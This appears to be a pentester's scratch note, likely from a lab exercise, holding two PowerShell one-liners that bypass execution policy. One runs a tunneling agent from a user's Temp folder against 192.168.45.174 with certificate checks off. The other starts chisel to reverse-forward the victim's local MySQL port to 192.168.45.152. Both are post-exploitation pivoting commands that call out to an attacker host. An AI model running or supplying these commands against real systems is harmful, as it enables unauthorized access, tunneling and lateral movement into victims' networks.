powershell.exe -ep bypass -c "Start-Job -ScriptBlock { C:\Users\apache.ERA\AppData\Local\Temp\agent.exe -ignore-cert -connect 192.168.45.174:7890 }" # might not run with external programs
powershell.exe -ep bypass -c "Start-Process C:\Users\apache.ERA\AppData\Local\Temp\chisel.exe -ArgumentList 'client 192.168.45.152:7890 R:3306:127.0.0.1:3306'"
